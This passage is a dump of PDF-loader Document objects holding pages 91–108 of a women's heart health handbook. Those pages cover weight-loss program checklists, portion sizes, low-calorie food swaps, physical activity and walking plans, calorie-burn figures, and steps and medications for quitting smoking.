              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 91}, page_content='■Does the program offer training on how to deal\\nwith times when you may feel stressed and slipback into old habits?\\nThe program should provide long-term strategies for preventing\\nand coping with possible weight problems in the future.  Thesestrategies might include setting up a support system and aregular physical activity routine.  \\n■Do you help make decisions on food choices and\\nweight-loss goals?In setting weight-loss goals, the program should consider your\\npersonal food likes and dislikes as well as your lifestyle.  Avoid\\na one-strategy-fits-all program.  \\n■Are there fees or costs for additional items, such as\\ndietary supplements?Before you sign up, find out the total costs of participating in the\\nprogram.  If possible, get the costs in writing. \\n■How successful is the program?\\nFew weight-loss programs gather reliable information on howwell they work.  Still, it is worthwhile to ask the following\\nquestions: \\n•What percentage of people who start this program complete it?\\n•What percentage of people experience problems or side\\neffects?  What are they?\\n•What is the average weight loss among those who finish theprogram?\\n— 90 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 92}, page_content='portion DISTORTION\\nHow To Choose Sensible Servings\\nIt’s very easy to “eat with your eyes” and misjudge what equals\\na serving—and pile on unwanted pounds.  This is especially truewhen you eat out, because restaurant portion sizes have been\\nsteadily expanding.  Twenty years ago, the average pasta\\nportion size was 2 cups, totaling 280 calories; today, it is 4cups, totaling 560 calories!  Use the guidelines below to keepportion sizes sensible: \\n■When eating out, choose small portion sizes, share an entree\\nwith a friend, or take some of the food home (if you can chill itright away).\\n■Check the Nutrition Facts label on product packages to learnhow much food is considered a serving as well as how muchfat and how many calories are in the food.\\n■Be especially careful to limit portion sizes of high-calorie foods,such as cookies, cakes, other sweets, sodas, french fries, oils,and spreads.\\n— 91 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 93}, page_content='THE SUBSTITUTION SOLUTION:\\nMaking the Switch to Low-Calorie Foods\\nHere are some tasty, low-calorie alternatives to old favorites.  Read labels to find\\nout how many calories are in the specific products you buy.  \\nInstead of Replace With\\nDairy Products\\nWhole milk Low-fat or fat-free milk\\nIce cream Sorbet, sherbet, fat-free frozen yogur t, \\nor reduced-fat ice cream\\nWhipping cream Imitation whipped cream (made with \\nfat-free milk) or low-fat vanilla yogur t \\nSour cream Plain, low-fat yogur t or fat-free sour cream\\nCream cheese Neufchâtel cheese or light or fat-free \\ncream cheese\\nCheese (sandwich types) Reduced-calorie, low-calorie, or fat-free\\ncheeses  \\nCereals and Pastas\\nRamen noodles Brown rice or whole-grain pasta\\nPasta with cheese sauce Whole-grain pasta with red sauce or vegetables \\nGranola Bran flakes, crispy rice cereals, cooked grits\\nor oatmeal, or reduced-fat granola \\nMeat, Fish, Poultr y\\nCold cuts, hotdogs Low-fat cold cuts and hotdogs \\n(watch sodium content)\\nBacon or sausage Canadian bacon or lean ham\\nRegular ground beef Extra-lean ground beef or ground turkey\\n— 92 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 94}, page_content='Instead of Replace With\\nChicken or turkey with skin White-meat chicken or turkey without skin  \\nOil-packed tuna* Water-packed tuna*\\nBeef (chuck, rib, brisket) Beef (round, loin) with fat trimmed off; \\nif possible, choose select grades  \\nPork (spareribs, untrimmed loin) Pork tenderloin, trimmed; lean smoked ham loin\\nWhole eggs Egg whites\\nBaked Goods\\nCroissants, brioches, etc. Hard French rolls or “brown ‘n ser ve” rolls\\nDonuts, sweet rolls, or muffins Reduced-fat or fat-free cookies (graham\\ncrackers, ginger snaps, fig bars) \\nCake (pound, layer) Cake (angel food, gingerbread)\\nCookies Reduced-fat or fat-free cookies (graham\\ncrackers, ginger snaps, fig bars) \\nFats, Oils, Salad Dressings\\nRegular margarine or butter Light-spread, reduced-calorie, or diet\\nmargarines; look for trans fat-free\\nmargarines\\nRegular mayonnaise Light or diet mayonnaise\\nRegular salad dressings Reduced-calorie or fat-free dressings, lemon\\njuice, or vinegars \\nButter or margarine on toast Jelly, jam, or honey on toast\\nOils, shor tening, or lard Nonstick cooking spray instead of \\ngreasing pans for sauteing  \\n*Women who are pregnant or may become pregnant, nursing mothers, and young\\nchildren should avoid some types of fish and eat types lower in mercury.  See the\\nWeb site www.cfsan.fda.gov/~dms/admehg3.html for more information.\\n— 93 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 95}, page_content='Learn New Moves\\nRegular physical activity is a powerful way to reduce your risk ofheart disease.  Physical activity directly helps to prevent heart\\nproblems.  Staying active also helps to prevent and control high\\nblood pressure, keep cholesterol levels healthy, and prevent andcontrol diabetes.  Plus, regular physical activity is a great way tohelp take off extra pounds—and keep them off.\\nFor women who have heart disease, regular, moderate physical\\nactivity lowers the risk of death from heart-related causes.  If youhave already had a heart attack, you still can benefit greatlyfrom becoming more active.  Many hospitals offer cardiac (heart)\\nrehabilitation programs that include a wide range of physicalactivities.  Ask your doctor for advice about the best program for you.\\nRegular physical activity has a host of other health benefits.  \\nIt may help to prevent cancers of the breast, uterus, and colon.Staying active also strengthens the lungs, tones the muscles,keeps the joints in good condition, improves balance, and mayslow bone loss.  It also helps many people sleep better, feel lessdepressed, cope better with stress and anxiety, and generallyfeel more relaxed and energetic.\\nWomen can benefit from physical activity at any age.  In fact,\\nstaying active can help prevent, delay, or improve many age-related disabilities.  Older women in particular may benefit fromweight-bearing activities, which keep bones and muscleshealthier as well as improve balance and lower the risk forserious falls.  Good weight-bearing activities include carryinggroceries, walking, jogging, and lifting weights.  (Start with 1- to2-pound hand weights and gradually progress to heavier weights.)\\nActivities that promote flexibility and balance also are important,\\nespecially for older women.  Practices such as t’ai chi and yoga\\n— 94 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 96}, page_content='can improve balance and flexibility and can be done alternately\\nwith heart healthy physical activities.  Check with your localrecreation center, YWCA or YMCA, or adult-education program\\nfor low-cost classes in your area.\\nA Little Activity Goes a Long Way \\nThe good news is that to reap benefits from physical activity, you\\ndon’t have to run a marathon—or anything close to it.  To reducethe risk of disease, you need only do about 30 minutes of\\nmoderate activity on most, and preferably all, days of the week.\\nIf you’re trying to manage your weight and prevent gradual,unhealthy weight gain, try to boost that level to approximately60 minutes of moderate- to vigorous-intensity physical activity onmost days of the week.\\nBrisk walking (3 to 4 miles per hour) is an easy way to help\\nkeep your heart healthy.  One study, for example, showed thatregular, brisk walking reduced women’s risk of heart attack by\\nthe same amount as more vigorous exercise, such as jogging.To make regular activity a pleasure rather than a chore, chooseactivities you enjoy.  Ride a bike.  Go hiking.  Dance.  Swim.And keep doing physical tasks around the house and yard.  Trimyour hedges with hand clippers.  Rake leaves.  Mulch yourgarden.  Paint a room.\\nYou can do an activity for 30 minutes at one time or choose\\nshorter periods of at least 10 minutes each.  For example, youcould spend 10 minutes walking on your lunch break, another10 minutes raking leaves in the backyard, and another 10minutes lifting weights.  The important thing is to total about 30minutes of activity each day.\\nIf you haven’t been physically active for some time, don’t let \\nthat stop you.  Start slowly and gradually increase to therecommended goal.  For example, if you want to begin walking\\n— 95 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 97}, page_content='regularly, begin with a 10- to 15-minute walk three times a\\nweek.  As you become more fit, you can increase the number ofsessions until you’re doing something every day.  Gradually,\\nlengthen each walking session and quicken your pace.  Before\\nlong, you will have reached your goal—walking briskly for atleast 30 minutes daily to reduce the risk of disease or walking60 minutes per day if you’re also trying to manage your weight.(See “A Sample Walking Program” on page 98.)\\nMaking Opportunities\\nGetting regular physical activity can be easy—especially if you take\\nadvantage of everyday opportunities to move around.  For example: \\n■Use stairs—both up and down—instead of elevators.  Startwith one flight of stairs and gradually build up to more.\\n■Park a few blocks from the office or store and walk the rest ofthe way.  If you take public transportation, get off a stop ortwo early and walk a few blocks.\\n■Instead of eating that rich dessert or extra snack, take a briskstroll around the neighborhood.\\n■Do housework or yard work at a more vigorous pace.\\n■When you travel, walk around the airport, train, bus, orsubway station rather than sitting and waiting.\\n■Keep moving while you watch TV.  Lift hand weights, do somegentle yoga stretches, or pedal an exercise bike.\\n■Spend less time watching TV and using the computer.\\n■Take a movement break in the middle of the day.  Get up andstretch, walk around, and give your muscles and mind achance to relax.\\n— 96 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 98}, page_content='Safe Moves \\nSome people should get medical advice before starting regular\\nphysical activity.  Check with your doctor if you:\\n■Are over 50 years old and are not used to moderately energetic activity.\\n■Currently have heart trouble or have had a heart attack.\\n■Have a parent or sibling who developed heart disease at an early age.\\n■Have a chronic health problem, such as high blood pressure,diabetes, osteoporosis, or obesity.\\n■Tend to easily lose your balance or become dizzy.\\n■Feel extremely breathless after mild exertion.\\n■Are on any type of medication.\\nOnce you get started, keep these guidelines in mind:\\nGo slow.  Before each activity session, allow a 5-minute period\\nof stretching and slow movement to give your muscles a chanceto limber up and get ready for more exercise.  At the end of thewarmup period, gradually increase your pace.  Toward the endof your activity, take another 5 minutes to cool down with aslower, less energetic pace.    \\nListen to your body.  A certain amount of stiffness is normal\\nat first.  But if you hurt a joint or pull a muscle, stop the activity\\nfor several days to avoid more serious injury.  Rest and over-the-counter painkillers properly taken can heal most minor muscle andjoint problems.\\nCheck the weather report.  Dress appropriately for hot,\\nhumid days and for cold days.  In all weather, drink lots of water before, during, and after physical activity.  \\n— 97 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 99}, page_content='Pay attention to warning signals.  Although physical\\nactivity can strengthen your heart, some types of activity may\\nworsen existing heart problems.  Warning signals include sudden\\ndizziness, cold sweat, paleness, fainting, or pain or pressure in\\nyour upper body just after doing a physical activity.  If younotice any of these signs, call your doctor right away.  \\nUse caution.  If you’re concerned about the safety of your\\nsurroundings, pair up with a buddy for outdoor activities.  \\nWalk, bike, or jog during daylight hours.\\nKeep at it.  Unless you have to stop your activity for a health\\nreason, stick with it.  If you feel like giving up because you thinkyou’re not going as fast or as far as you should, set smallershort-term goals for yourself.  If you find yourself becomingbored, try doing an activity with a friend.  Or switch to anotheractivity.  The tremendous health benefits of regular, moderate-intensity physical activity are well worth the effort.  \\nNo Excuses! \\nWe all have reasons to stay inactive.  But with a little thought\\nand planning, you can overcome most obstacles to physicalactivity.  For example:\\n“I don’t have time to exercise.” Physical activity does take\\ntime, but remember that you can reduce your risk of disease by\\ngetting only 30 minutes of moderate-intensity activity on most daysof the week.  Plus, you can save time by doubling up on someactivities.  For example, you can ride an exercise bike or use handweights while watching TV.  Or, you can transform some of youreveryday chores—like washing your car or walking the dog—intoheart healthy activities by doing them more briskly than usual.\\n“I don’t like to exercise.” You may have bad memories of\\ndoing situps or running around the track in high school, forcing\\nyourself through every sweating, panting moment.  Now we \\n— 98 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 100}, page_content='know that you can get plenty of gain without pain.  Activities you\\nalready do, such as gardening or walking, can improve yourhealth.  Just do more of the activities you like.  Try to get friends\\nor family members involved so that you can support each other.  \\n“I don’t have the energy to be more active.” Get active\\nfirst—with brief periods of moderate-intensity physical activity—\\nand watch your energy soar.  Once you begin regular physicalactivity, you will almost certainly feel stronger and morevigorous.  As you progress, daily tasks will seem easier.  \\n“I keep forgetting to exercise.” Leave your sneakers near\\nthe door to remind yourself to walk or bring a change of clothes\\nto work and head straight for the gym, yoga class, or walkingtrail on the way home.  Put a note on your calendar to remindyourself to exercise.  While you’re at it, get in the habit ofadding more activity to your daily routine.  \\nMove It and Lose It\\nActivity  _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _Calories Burned Per Hour*\\nWalking, 2 mph  _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _240\\nWalking, 3 mph  _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _320\\nWalking, 4.5 mph  _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _440\\nBicycling, 6 mph  _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _240\\nBicycling, 12 mph  _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _410\\nTennis, singles  _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _400\\nSwimming, 25 yds per minute  _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _275\\nSwimming, 50 yds per minute  _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _500\\nHiking  _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _408\\nCross-countr y skiing  _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _700\\nJumping rope  _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _750\\nJogging, 5.5 mph  _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _740\\nJogging, 7 mph  _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _920\\n* For a healthy, 150-pound woman.  A lighter person burns fewer calories; \\na heavier person burns more.\\n— 99 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 101}, page_content='A SAMPLE WALKING PROGRAM\\nWarm Up Activity Cool Down TotalTime\\nWeek 1\\nWalk slowly 5 min. Walk briskly 5 min. Walk slowly 5 min. 15 min.\\nWeek 2\\nWalk slowly 5 min. Walk briskly 7 min. Walk slowly 5 min. 17 min.\\nWeek 3\\nWalk slowly 5 min. Walk briskly 9 min. Walk slowly 5 min. 19 min.\\nWeek 4\\nWalk slowly 5 min. Walk briskly 11 min. Walk slowly 5 min. 21 min.\\nWeek 5\\nWalk slowly 5 min. Walk briskly 13 min. Walk slowly 5 min. 23 min.\\nWeek 6\\nWalk slowly 5 min. Walk briskly 15 min.  Walk slowly 5 min. 25 min.\\nWeek 7\\nWalk slowly 5 min. Walk briskly 18 min. Walk slowly 5 min. 28 min.\\nWeek 8\\nWalk slowly 5 min.  Walk briskly 20 min. Walk slowly 5 min. 30 min.\\nWeek 9\\nWalk slowly 5 min. Walk briskly 23 min. Walk slowly 5 min. 33 min.\\nWeek 10\\nWalk slowly 5 min. Walk briskly 26 min.  Walk slowly 5 min. 36 min.\\nWeek 11\\nWalk slowly 5 min. Walk briskly 28 min. Walk slowly 5 min. 38 min.\\nWeek 12\\nWalk slowly 5 min. Walk briskly 30 min. Walk slowly 5 min. 40 min.\\n— 100 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 102}, page_content='You CanStop Smoking\\nThe good news is that quitting smoking immediately reduces your risk\\nof heart disease, cancer, and other serious disorders, with the benefits\\nincreasing over time.  Just 1 year after you stop smoking, your heart\\ndisease risk will drop by more than half.  Within several years, it willapproach the heart disease risk of someone who has never smoked.No matter how long you have been smoking, or how much, quittingwill lessen your chances of developing heart disease.\\nIf you already have heart disease, giving up cigarettes will lower your\\nrisk of a heart attack.  Quitting also reduces the risk of a second heartattack in women who have already had one.  There is nothing easy\\nabout giving up cigarettes.  But with support and a plan of action,you \\ncando it.  \\nGetting Ready To Quit\\n■Get motivated.  Take some time to think about all the benefits of\\nbeing smoke free.  Besides the health benefits of quitting, what else\\ndo you have to gain?  Loved ones no longer exposed to secondhand\\nsmoke?  A better appearance?  No more standing outside in the cold\\nor rain for a smoke?  More money to spend on things besidescigarettes?  Write down all of the reasons you want to stop smoking.  \\n■Choose a quit date.  Give yourself enough time to prepare\\nto stop smoking—but not too much!  It’s best to choose a date\\nabout 2 weeks away.\\n■Consider a “quit-smoking” aid.  Ask your doctor about\\nusing a medication that can help you stay off cigarettes.  Theseaids include a patch, gum, inhaler, nasal spray, and lozenges.\\nSome of these medicines are available over the counter.\\nOthers require a prescription.  All contain very small amountsof nicotine, which can help to lessen the urge to smoke.  Twoother prescription quitting aids are bupropion sustained release(Zyban™), a medicine that contains no nicotine but reduces thecraving for cigarettes, and varenicline tartrate (Chantix™), \\n— 101 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 103}, page_content=\"“I WAS 3 MONTHS PREGNANT WITH MY\\nSECOND CHILD WHEN I STARTED HA VING\\nA RACING HEARTBEAT.  I ENDED UP BEINGDIAGNOSED WITH HYPERTROPHICCARDIOMYOPATHY—THICKER THAN NORMAL\\nHEART WALLS.  THE CONDITION IS\\nGENETIC, BUT I DIDN'T KNOW\\nOF ANYONE ELSE IN MY\\nFAMILY WHO HAD IT.  I GET\\nREGULAR CHECKUPS AND TAKE\\nCARE OF MY OVERALL\\nHEALTH, AND I TEACH MY KIDS\\nTO MAINTAIN A HEALTHY\\nLIFESTYLE.  MY DAUGHTERS\\nHAVE BEEN SCREENED FOR\\nHEART DISEASE.”  \\n—Shannon\\n— 102 —\"),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 104}, page_content='which both eases withdrawal symptoms and blocks the effects\\nof nicotine if you slip and begin smoking again.  If you decideto use one of these medicines, be sure to talk with your doctor\\nabout how to use it properly.\\n■Line up support.  Many women find that quitting smoking is\\neasier with the support of others.  Tell your family, friends, andcoworkers that you plan to quit and let them know how they\\ncan help you.  For example, if someone close to you smokes,\\nask him or her not to smoke around you.  (It is easier to quitwhen people around you aren’t smoking.)  You might also finda support group or Internet chat room helpful.  Plan to get intouch with your “support team” regularly to share yourprogress and to get encouragement.  If possible, quit with afriend or family member.  \\n■Make a fresh start.  The day before you quit, get rid of all\\ncigarettes in your home, your car, or at work.  (Keeping a fewcigarettes “just in case I need them” will lower your chances of\\nsuccess.)  Throw away ashtrays, matches, and lighters.  Many\\nwomen like to quit with a clean, fresh home or car that is free of cigarette odor.  You may want to clean the drapes orshampoo the carpet of your home or car.  After quitting, you’llenjoy the new scents as your sense of smell returns.\\nBreaking the Habit\\n■Know what to expect.  The first few weeks can be tough.\\nMost people experience strong urges to smoke as well as\\nwithdrawal symptoms, such as headaches, difficulty sleeping,\\ntrouble concentrating, and feeling cranky or nervous.  While\\nthese reactions are not pleasant, it’s important to know thatthey are signs that your body is recovering from smoking.Within a few weeks, most people already feel much better.\\n— 103 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 105}, page_content='■Know yourself.  To quit successfully, you need to know your\\npersonal smoking “triggers.” These are the situations and feelings\\nthat usually bring on the urge to light up.  Some common triggers\\nare drinking coffee, having an alcoholic drink, talking on the\\nphone, watching someone else smoke, and experiencing stressor depression.  Make a list of your own personal triggers andavoid as many of them as you can.  For those you can’t avoid,plan now for how you will deal with them.\\n■Find new habits.  Replace your triggers with new activities\\nthat you don’t associate with smoking.  For example, if you have\\nalways had a cigarette with a cup of coffee, switch to tea for a\\nwhile.  If stress is a trigger for you, try a relaxation exercise such\\nas deep breathing to calm yourself.  (Take a slow, deep breath,count to five, and release it.  Repeat 10 times.) \\n■Keep busy.  Get involved in activities that require you to use your\\nhands, such as needlework, jigsaw puzzles, or fixup projects aroundyour house or apartment.  When you feel the urge to put something\\nin your mouth, try some vegetable sticks, apple slices, or sugarless\\ngum.  Some people find it helpful to inhale on a straw or chew on atoothpick until the urge passes.  \\n■Keep moving.  Walk, garden, bike, or do some yoga\\nstretches.  Physical activity will make you feel better and helpprevent weight gain.\\n■Be good to yourself.  Get plenty of rest, drink lots of water,\\nand eat three healthy meals each day.  If you are not asproductive or cheerful as usual during the first weeks after\\nquitting, be gentle with yourself.  Give yourself a chance to\\nadjust to being a nonsmoker.  Congratulate yourself for making a major, positive change in your life.\\n— 104 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 106}, page_content='If You Slip\\nA slip means that you’ve had a small setback and smoked a cigarette\\nafter your quit date.  This is most likely to happen during the first 3 months after quitting.  Below are three suggestions to help you get\\nright back on the nonsmoking track:\\n■Don’t be discouraged.  Having a cigarette or two doesn’t\\nmean you can’t quit smoking.  A slip happens to many, many\\npeople who successfully quit.  Keep thinking of yourself as a\\nnonsmoker.  You are one.  \\n■Learn from experience.  What was the trigger that made\\nyou light up?  Were you driving home from work, having a glassof wine at a party, or feeling angry with your boss?  Think back\\non the day’s events until you remember what the\\ntrigger was.\\n■Take charge.  Write a list of things\\nyou’ll do the next time you face thattrigger situation and other tempting\\nsituations as well.  Keep the list and\\nadd to it whenever necessary.Even years after quitting, certainplaces, people or events cantrigger a strong urge to smoke.So stay aware, plan ahead,and know that you canquit—for good.\\n— 105 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 107}, page_content='five AIDS FOR QUITTING\\nAs you prepare to quit smoking, consider using a medication that can\\nhelp you stay off cigarettes.  Some of these medications contain verysmall amounts of nicotine, which can help to lessen the urge to smoke.\\nThey include nicotine gum (available over the counter), the nicotine patch\\n(available over the counter and by prescription), a nicotine inhaler(by prescription only), and a nicotine nasal spray (by prescription only).Another quitting aid is bupropion sustained release (Zyban™), amedicine that contains no nicotine but reduces the craving for cigarettes.Varenicline tartrate (Chantix™) eases withdrawl symptoms and blocks\\nthe effects of nicotine if you slip and start smoking again.  Both are\\navailable only by prescription.  While all of these medications can helppeople to stop smoking, they are not safe for everyone.  Talk with your\\ndoctor about whether you should try any of these aids.  \\nA WEIGHTY concern\\nMany women fear that if they stop smoking, they will gain unwanted\\nweight.  But most exsmokers gain less than 10 pounds.  Weight gainmay be partly due to changes in the way the body uses calories after\\nsmoking stops.  Some people also may gain weight because they\\nsubstitute high-calorie food for cigarettes.  Choosing lower caloriefoods and getting more physical activity can reduce the amount ofweight you gain.\\nIf you do put on some weight, you can work on losing it after you have\\nbecome comfortable as a nonsmoker.  Meanwhile, concentrate onbecoming smoke free—your heart health depends on it.\\n— 106 —'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/hdbk_wmn.pdf', 'page': 108}, page_content='FOR WOMEN who HAVE HEART DISEASE\\nhelp to lessen the severity of your condition.  If you smoke, you’llIf you have heart disease, it is extremely important \\nto control it.  Eating well, engaging in regular\\nphysical activity, and maintaining a healthy weight will\\nneed to quit.  And if you have diabetes, you will need to manage it\\ncarefully.\\nYou also may need certain tests, medications, or special procedures.\\nThis section explains each of these and how they can help to protectyour heart health.\\nScreening Tests\\nIn most cases, you will need some tests to find out for sure if you\\nhave heart disease and how severe it is.  If your doctor doesn’tmention tests, be sure to ask whether they could be helpful.  Mostscreening tests are done outside the body and are painless.  Aftertaking a careful medical history and doing a physical examination,your doctor may give you one or more of the following tests:\\n■Electrocardiogram (ECG or EKG) makes a graph of the\\nheart’s electrical activity as it beats.  This test can show\\nabnormal heartbeats, heart muscle damage, blood flow\\nproblems in the coronary arteries, and heart enlargement.  \\n■Stress test (or treadmill test or exercise ECG) records the\\nheart’s electrical activity during exercise, usually on a treadmillor exercise bike.  The test can detect whether the heart is getting\\nenough blood and oxygen.  